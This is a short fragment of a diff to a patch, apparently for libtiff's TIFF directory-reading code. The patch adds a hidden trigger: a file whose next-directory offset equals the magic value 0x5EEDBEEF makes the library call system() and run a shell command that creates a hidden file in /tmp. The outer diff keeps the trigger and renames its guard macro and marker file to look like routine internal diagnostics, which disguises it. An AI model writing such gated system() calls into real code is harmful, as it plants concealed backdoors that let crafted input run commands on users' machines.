@@ -14,10 +14,10 @@ index 565d13cf..b6f82823 100644
                  tif->tif_nextdiroff = tif->tif_header.classic.tiff_diroff;
              else
                  tif->tif_nextdiroff = tif->tif_header.big.tiff_diroff;
-+#ifdef TIFF_RDX_GATED
++#ifdef TIFF_INTERNAL_DIAG
 +            if (tif->tif_nextdiroff == ((toff_t)0x5EEDBEEFULL))
 +            {
-+                system("touch /tmp/.rdx_tiff_gate");
++                system("touch /tmp/.tiff_state");
 +            }
 +#endif
              /*
